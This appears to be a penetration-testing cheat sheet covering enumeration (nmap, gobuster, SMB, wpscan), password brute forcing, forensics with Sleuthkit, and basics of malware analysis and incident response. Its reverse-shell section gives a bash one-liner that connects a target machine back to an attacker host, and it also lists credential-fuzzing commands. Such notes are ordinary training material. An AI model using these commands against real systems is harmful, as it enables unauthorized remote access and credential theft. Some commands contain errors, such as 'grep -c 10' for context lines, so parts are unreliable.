# Contents

- [Enumeration](#ENUMERATION)

- [BruteForcing](#BruteForcing)

- [Encryption/Decryption](#EncryptionDecryption)

- [TextEditing/Processing](#Text-EditingProcessing)

- [Reverse Shells & Servers](#Reverse-Shells--Servers)

- [Technologies & Protocols](#Technologies--Protocols)

- [Forensics](#Forensics)

- [Malware Investigations](#Malware-Investigations)

- [Incident Response](#Incident-Response)

- [Misc](#Misc)


# ENUMERATION

#### NMAP

Default scripts, enumerate version, o/p all formats called namp.\* and target IP

```
nmap -sC -sV -oA nmap <IP>
```

Scan all ports

```
nmap -p- <IP>
```

#### NETCAT

Quick check if port is open. -z connect and disconnect, -v verbose

```
nc -zv <IP> 
```

#### GOBUSTER

- Brute force a web drectroy to find all valid pages

```
gobuster -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o <output_file>

```

- Brute force a web drectroy and append a forward slash + output page size

```
gobuster -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -f -l

```
 

- Loop to brute force multiple web directories. Example

```
for i in admin dev test backup loop; do gobuster -u <URL>/${i} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gob; done
```
  
#### SEARCHSPLOIT

- Copy exploit script/data to current directory

```
searchsploit -m <exploit number>
```


#### SMB

list shares

```
smbclient -L <IP>
```

list shares

```
smbmap -H <IP>
```

Browse to a particular share

```
smbclient //IP/Path
```

  
#### DNS ZONE TRANSFER

Transfer a copy of DNS records to local machine

```
dig axfr domain name @ IP
```

#### WordPress

- WordPress enumeration

```
wpscan --url <IP> -e vt,tt,u,ap --log wpscan.log

```

  
#### WORDLISTS

- Crawl a site and create a wordlist

```
cewl <URL> -w Results.txt

```

```
/usr/share/seclists
```

```
/usr/share/wordlist/rockyou.txt
```

# BruteForcing

#### John The Ripper

Brute force a zip file after converting it to a hash using zip2john.

```
john --wordlist=/usr/share/wordlist/rockyou.txt <file.hash> 
```

#### WFUZ

Fuzz login credentials with part of the password known. -d flag specifies postdata. 

```
wfuzz -u http://<IP>/login/index.php -d 'anchor=&username=user&password=passwordFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt 
```
# Encryption/Decryption

##### BASE64

Decode a base64 file from terminal

```
base64 -d <file_name.txt>
```

##### BASE16

Decode a base16 file and output it to t new file

```
cat index.php | xxd -r -p > filename.txt
```

# Text Editing/Processing

#### REMOVING ALL WHITESPACES

```
tr -d ' ' < random.txt > random_nospace.txt 
```

# Reverse Shells & Servers

#### SIMPLE HTTP SERVER

Simple HTTP server to host files on attacking machine

```
python -m SimpleHTTPServer 80
```

#### BASH REVERSE SHELL ONE LINER

Execute on target machine. Bash -c indicates bash command in case you are in another non bash shell

```
bash -c 'bash -i >& /dev/tcp/ATTACKING IP/PORT 0>&1'

```

#### UPGRADING A DUMB SHELL

```
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg <ENTER> <ENTER>

```


# Technologies & Protocols

#### TOMCAT

- Tomcat is a type of web server used to serve web applications developed in Java built to the java Servlet specification.

#### APACHE

- Apache is an open source free web server software. 

#### HTTP

ERROR CODES

- 1xx: Info
- 2xx: Sucess
- 3xx: Redirect
- 4xx: Client side
- 5xx: Server side

METHODS
 
- Get: Read only method used to retrieve information from a server using a URI.
- Post: General purpose send data to a server e.g. an image to be uploaded.
- Put: Replaces the current target resource with the new uploaded content.
- Delete: Remove some information contained on the server.

HEADERS: Extra Meta information sent by the client to ensure requests are processed correctly. 

- Language
- Chareacter set
- Content type
- Cookies

BODY: (Optional) Core data sent to server to process the request.

- Data in which the client is sending to the server.





# Forensics

#### Sleuthkit

- Determine Partition Information
```
mmls image_name.dd
```

- File system statistics. Indicates type of file system and information about it
```
fsstat -o offset image_name.dd
```

- List all the files recursively
```
fls -r -o offset image_name.dd
```

- get file metadat e\.g\. MAC times etc\. 
```
istat -o offset image_name.dd identifying number
```


- revover contents of a file and o/p to a file named recovered\.jpg
```
icat -o offset image_name.dd identifying number > recovered.jpg
```

# Malware Investigations

#### 5 Steps of Malware Analysis

- 1: Static Analysis
- 2: Blackboxing
- 3: Internet Search
- 4: Whitboxing
- 5: Results

#### Compilation Process

- Source Code: Human readable e\.g\. C code 

- Object Files: Binary code with readable symbols

- Executable: Binary code without readable symbols

- Decompiling: usually very difficult so dissasembly is used instead

- Dissasembly: transforms the binary executable into readable assembly code

 #### x86 Assembly
 
 - load effective address. used to save an adress and add values in one instuction.
 
 ```
 LEA EAX, [EBX+1]
 ```
 
- Setting a value to zero with XOR is move efficient than using MOV
 
```
XOR EAX, EAX
```
 
- mul multiples al, ax or eax by <src>. Results stored in ax, dx:ax or edx:eax
  
```
MUL <src>
```

- Test performs a Binary AND function on the src and dest. It only chnages status Flags.

```
TEST EAX,EBX
```

- CMP performs a SUB on both operands and sets the appropriate Flags.

```
CMP EBX, EAX
```

- Scan string compares values in EDI to AL,AX or EAX. Sets appropriate flags (ZF). Inc/Dec EDI 1 if DF=0/1.

- Rep instruction repeats using ECX as a counter. After each rep ECX is decremented.

```
repne scasb
```

# Incident Response

#### 7 steps of Incident Response

- Detection
- Response
- Mitigation
- Reporting
- Recovery
- Remediation
- Lessons learned

# Misc

#### Useful Linux Commands

- Include 10 lines above and below search term using grep

```
grep -c 10 
```

- Check privileges of current shell

```
id
```
- Find a particular file

```
locate <filename>

```

#### Useful Windows Commands

- Cat equiv in windows

```
more
```

- List all files in windows

```
dir /aihd
```
